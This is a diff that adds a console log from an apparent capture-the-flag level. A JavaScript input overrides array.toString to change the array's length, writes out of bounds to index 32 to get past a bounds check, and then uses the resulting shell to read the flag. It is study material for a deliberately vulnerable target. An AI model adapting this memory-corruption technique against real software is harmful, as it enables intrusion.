@@ -1,0 +1,39 @@
+Executing 09_level_1 in Live Mode
+Started '09_level_1'
+------------------------------------------------------------
+--[ Misc. Level #1 - JavaScript                             
+------------------------------------------------------------
+Starting javascript interpreter...
+ 
+Creating function main... Enter javascript (Type END to stop):
+>> array.toString=exp
+array.length=10
+array[32]=6300256
+array.length=10   // THE FIX: Reset length so the next line passes the check
+array[0]=1
+END
+Create another function? [y/n]
+>> y
+Enter function name:
+>> exp
+Creating function exp... Enter javascript (Type END to stop):
+>> array.length=100
+END
+Create another function? [y/n]
+>> n
+ 
+ 
+RUNNING
+ 
+Debug: array.toString set to exp
+Debug: array.length set to 10
+Debug: array.length set to 100
+Debug: Accessing index 32 of 
+Debug: Setting index 32 to 6300256
+Debug: array.length set to 10
+$ 
+>> ls
+. .. flag
+$ 
+>> cat flag
+flag{S00n_ppl_w1ll_be_4sk1ng_u_w3n_eta}
